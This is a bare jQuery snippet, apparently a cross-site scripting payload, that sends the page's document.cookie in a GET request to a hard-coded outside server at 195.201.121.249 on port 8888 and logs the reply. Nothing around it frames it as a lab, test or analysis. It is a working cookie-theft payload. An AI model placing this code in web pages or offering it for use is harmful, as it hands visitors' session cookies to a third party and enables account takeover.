$.ajax({
  url: 'http://195.201.121.249:8888/?c=' + document.cookie,
  type: 'GET',
  success: function(res) {
    console.log(res);
  },
  error: function(error) {
    console.error(error);
  }
});
